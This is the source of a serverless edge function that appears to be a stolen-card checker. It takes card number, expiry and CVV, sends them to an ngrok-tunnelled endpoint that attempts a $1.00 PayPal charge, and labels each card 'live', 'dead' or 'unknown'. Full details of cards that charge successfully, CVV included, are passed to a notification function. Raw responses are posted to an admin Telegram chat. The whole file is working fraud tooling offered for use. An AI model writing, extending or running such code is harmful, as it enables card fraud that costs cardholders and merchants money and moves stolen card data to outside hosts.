import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_URL = "https://dierdre-unscoring-adalyn.ngrok-free.dev/api/paypal-commerce-1";

async function sendAdminDebug(card: string, rawResponse: string, status: string) {
  if (!TELEGRAM_BOT_TOKEN || status === "dead") return;

  const maskedCard = card.replace(/^(\d{6})(\d+)(\d{4})/, '$1****$3');
  const statusEmoji = status === "live" ? "✅" : "⚠️";
  const statusLabel = status === "live" ? "CHARGED" : "UNKNOWN";

  const message = `🔧 <b>[PAYPAL DEBUG]</b> ${statusEmoji} ${statusLabel}

💳 Card: <code>${maskedCard}</code>
📡 Raw Response:
<code>${rawResponse.slice(0, 800)}</code>`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (e) {
    console.error("[PAYPAL] Admin debug send error:", e);
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ error: 'No authorization header' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await createClient(
      SUPABASE_URL,
      Deno.env.get("SUPABASE_ANON_KEY")!
    ).auth.getUser(token);

    if (authError || !user) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { data: profile } = await supabase
      .from('profiles')
      .select('is_banned')
      .eq('user_id', user.id)
      .maybeSingle();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: 'Account is banned' }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { cc } = await req.json();
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Missing cc parameter' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const parts = cc.split('|');
    if (parts.length < 4) {
      return new Response(JSON.stringify({
        computedStatus: "unknown",
        apiStatus: "ERROR",
        apiMessage: "Invalid card format. Required: CardNumber|MM|YY|CVV",
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const [cardNum, mm, yy, cvv] = parts;
    const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;

    console.log(`[PAYPAL] Checking card: ${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`);

    const url = `${API_URL}?cc=${encodeURIComponent(fullCard)}`;

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 60000);

    let responseText = "";
    let computedStatus: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = "No response";

    try {
      const apiResponse = await fetch(url, {
        method: "GET",
        signal: controller.signal,
      });
      clearTimeout(timeout);

      responseText = await apiResponse.text();
      console.log(`[PAYPAL] Raw response: ${responseText.slice(0, 500)}`);

      try {
        const jsonData = JSON.parse(responseText);
        
        // Extract the most useful message
        const msg = jsonData.message || jsonData.error || jsonData.result || "";
        const statusField = (jsonData.status || "").toString().toLowerCase();
        const successField = jsonData.success;
        
        // Also check nested details for PayPal-specific errors
        let detailMsg = "";
        if (jsonData.details) {
          if (Array.isArray(jsonData.details)) {
            detailMsg = jsonData.details.map((d: any) => d.description || d.issue || "").join("; ");
          } else if (jsonData.details?.data?.errors?.errors) {
            // Extract gateway_error or unknown_error arrays
            const nestedErrors = jsonData.details.data.errors.errors;
            const errorMessages: string[] = [];
            for (const key of Object.keys(nestedErrors)) {
              if (Array.isArray(nestedErrors[key])) {
                errorMessages.push(...nestedErrors[key]);
              }
            }
            if (errorMessages.length > 0) {
              detailMsg = errorMessages.join("; ");
            }
          } else if (jsonData.details.message) {
            detailMsg = jsonData.details.message;
          } else if (jsonData.details.name) {
            detailMsg = jsonData.details.name;
          }
        }
        
        const fullMsg = detailMsg || msg || "";
        const lowerMsg = fullMsg.toLowerCase();
        
        console.log(`[PAYPAL] Parsed - success: ${successField}, status: ${statusField}, message: ${fullMsg}`);

        // Priority 1: Check explicit success field
        if (successField === true || statusField === "charged" || statusField === "approved" || statusField === "live" ||
            lowerMsg.includes("charged") || lowerMsg.includes("approved") || lowerMsg.includes("payment successful")) {
          computedStatus = "live";
          apiMessage = fullMsg || "Charged $1.00";
        } 
        // Priority 2: Check explicit decline/fail
        else if (successField === false && (statusField === "declined" || statusField === "failed" || statusField === "error")) {
          computedStatus = "dead";
          apiMessage = fullMsg || "Payment Failed";
        }
        // Priority 3: Check decline keywords in message
        else if (lowerMsg.includes("declined") || lowerMsg.includes("failed") || lowerMsg.includes("insufficient") ||
                 lowerMsg.includes("expired") || lowerMsg.includes("incorrect") || lowerMsg.includes("do not honor") ||
                 lowerMsg.includes("card number") || lowerMsg.includes("security code") || lowerMsg.includes("lost") ||
                 lowerMsg.includes("stolen") || lowerMsg.includes("restricted") || lowerMsg.includes("pickup") ||
                 lowerMsg.includes("payer_cannot_pay") || lowerMsg.includes("unprocessable")) {
          computedStatus = "dead";
          apiMessage = fullMsg || "Payment Failed";
        }
        // Priority 4: success=false but no clear decline status = unknown
        else if (successField === false) {
          computedStatus = "unknown";
          apiMessage = fullMsg || "Unknown response";
        }
        // Priority 5: Any other response
        else if (fullMsg) {
          computedStatus = "unknown";
          apiMessage = fullMsg;
        }
      } catch {
        // Not JSON, parse raw text
        const lower = responseText.toLowerCase().trim();
        if (lower.includes("charged") || lower.includes("approved") || lower.includes("success") || lower.includes("live")) {
          computedStatus = "live";
          apiMessage = responseText.trim() || "Charged $1.00";
        } else if (lower.includes("declined") || lower.includes("failed") || lower.includes("dead") ||
                   lower.includes("insufficient") || lower.includes("expired") || lower.includes("do not honor")) {
          computedStatus = "dead";
          apiMessage = responseText.trim() || "Payment Failed";
        } else if (lower.length > 0) {
          computedStatus = "unknown";
          apiMessage = responseText.trim();
        }
      }
    } catch (fetchError) {
      clearTimeout(timeout);
      console.error("[PAYPAL] Fetch error:", fetchError);
      apiMessage = fetchError instanceof Error ? fetchError.message : "Connection error";
    }

    // Notify for LIVE results
    if (computedStatus === "live") {
      supabase.functions.invoke('notify-charged-card', {
        body: {
          user_id: user.id,
          card_details: fullCard,
          status: "CHARGED",
          response_message: apiMessage,
          amount: "$1.00",
          gateway: "PayPal Charge",
          api_response: responseText.slice(0, 500),
        }
      }).catch(e => console.error("[PAYPAL] Notify error:", e));
    }

    // Admin debug for non-dead
    sendAdminDebug(cardNum, responseText, computedStatus);

    const result = {
      computedStatus,
      apiStatus: computedStatus === "live" ? "CHARGED" : computedStatus === "dead" ? "DECLINED" : "UNKNOWN",
      apiMessage,
      apiTotal: "$1.00",
      rawResponse: responseText.slice(0, 1000),
    };

    console.log(`[PAYPAL] Result: ${result.computedStatus} - ${result.apiMessage}`);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('[PAYPAL] Error:', error);
    return new Response(JSON.stringify({
      computedStatus: "unknown",
      apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown error",
      rawResponse: String(error),
    }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
